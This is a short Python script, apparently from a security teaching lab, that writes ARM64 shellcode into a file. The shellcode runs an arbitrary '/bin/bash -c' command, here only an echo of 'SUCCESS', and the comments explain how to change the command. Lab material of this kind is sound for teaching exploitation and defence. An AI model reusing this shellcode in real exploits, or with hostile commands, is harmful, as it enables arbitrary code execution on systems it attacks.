#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode= (
   "\xab\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
   "\x28\x05\x80\xd2\x69\x6a\x28\x38\x88\x05\x80\xd2\x69\x6a\x28\x38"
   "\xe8\x1d\x80\xd2\x69\x6a\x28\x38\x09\x04\x80\xd2\xe9\x03\x09\xcb"
   "\x69\x02\x09\xcb\x08\x01\x08\xca\x69\x6a\x28\xf8\x08\x01\x80\xd2"
   "\x49\x05\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8"
   "\x08\x02\x80\xd2\x09\x06\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb"
   "\x69\x6a\x28\xf8\x08\x03\x80\xd2\x29\x01\x09\xca\x69\x6a\x28\xf8"
   "\x09\x04\x80\xd2\xe9\x03\x09\xcb\x69\x02\x09\xcb\xe0\x03\x09\xaa"
   "\xe1\x03\x13\xaa\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2"
   "\xe1\x66\x02\xd4"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
   "/bin/bash*"
   "-c****"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same.
   # The * in this line serves as the position marker              *
   "echo '(^_^) SUCCESS SUCCESS (^_^)';                             "
   "                                                                "
   "                                                               *"
).encode('latin-1')


content = bytearray(500)
content[0:] = shellcode

# Save the binary code to file
with open('codefile_arm', 'wb') as f:
  f.write(content)
